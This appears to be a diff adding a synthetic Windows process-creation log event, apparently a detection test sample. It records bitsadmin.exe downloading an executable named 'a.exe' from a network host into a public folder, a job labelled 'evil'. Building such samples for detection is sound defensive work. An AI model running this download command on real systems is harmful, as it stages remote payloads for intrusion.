@@ -1,0 +1,8 @@
+{
+  "EventID": 1,
+  "Image": "C:\\Windows\\System32\\bitsadmin.exe",
+  "CommandLine": "bitsadmin.exe /transfer evil /download /priority high http://10.0.0.5/a.exe C:\\Users\\Public\\a.exe",
+  "ParentImage": "C:\\Windows\\System32\\cmd.exe",
+  "User": "VICTIM-PC\\analyst",
+  "_provenance": "synthetic"
+}
